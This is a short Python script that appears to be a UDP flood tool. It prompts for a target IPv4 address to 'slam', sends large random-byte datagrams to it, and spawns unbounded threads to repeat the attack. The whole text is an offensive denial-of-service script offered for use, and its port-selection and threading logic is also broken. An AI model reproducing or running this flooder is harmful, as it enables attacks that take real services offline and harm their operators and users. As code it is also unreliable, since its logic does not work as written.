#BEST UDP METHOD IN COM
import threading,socket,random,time,sys,os

def FLOOD():
    ip = input("IPV4 TO SLAM: ")
    port = [22, 80, 443, 8080, 1]
    randport=(True,False)[port==0]
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    bytes=random._urandom(15000)
    port=(random.randint(1,15000000),port)[randport]
    s.sendto(bytes,(ip,port))
    while True:
        t1 = threading.Thread(target=FLOOD)
        t1.start()
        t2 = threading.Thread(target=FLOOD)
        t2.start()
FLOOD()
